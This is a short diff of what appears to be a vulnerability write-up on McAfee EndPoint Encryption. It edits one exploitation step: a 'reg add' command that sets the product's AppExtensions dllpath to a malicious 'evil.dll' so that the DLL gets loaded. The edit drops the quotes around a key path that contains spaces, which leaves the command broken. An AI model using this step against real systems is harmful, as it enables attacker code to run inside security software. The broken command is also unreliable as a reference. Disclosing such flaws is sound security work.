@@ -64,7 +64,7 @@ It turns out the reason this works is because the DLL isn't injected into a McAf
 To exploit this vulnerability follow the steps below:
 
 1. Create your malicious dll (let's call it evil.dll)
-2. Run the following command to modify the registry: **reg add "HKLM\SOFTWARE\McAfee EndPoint Encryption\AppExtensions\MfeCryptoAdapter" /t reg_sz /v dllpath /d C:\path\to\malicious\dll\evil.dll**
+2. Run the following command to modify the registry: **reg add HKLM\SOFTWARE\McAfee EndPoint Encryption\AppExtensions\MfeCryptoAdapter /t reg_sz /v dllpath /d C:\path\to\malicious\dll\evil.dll**
 
 
 ## Demo
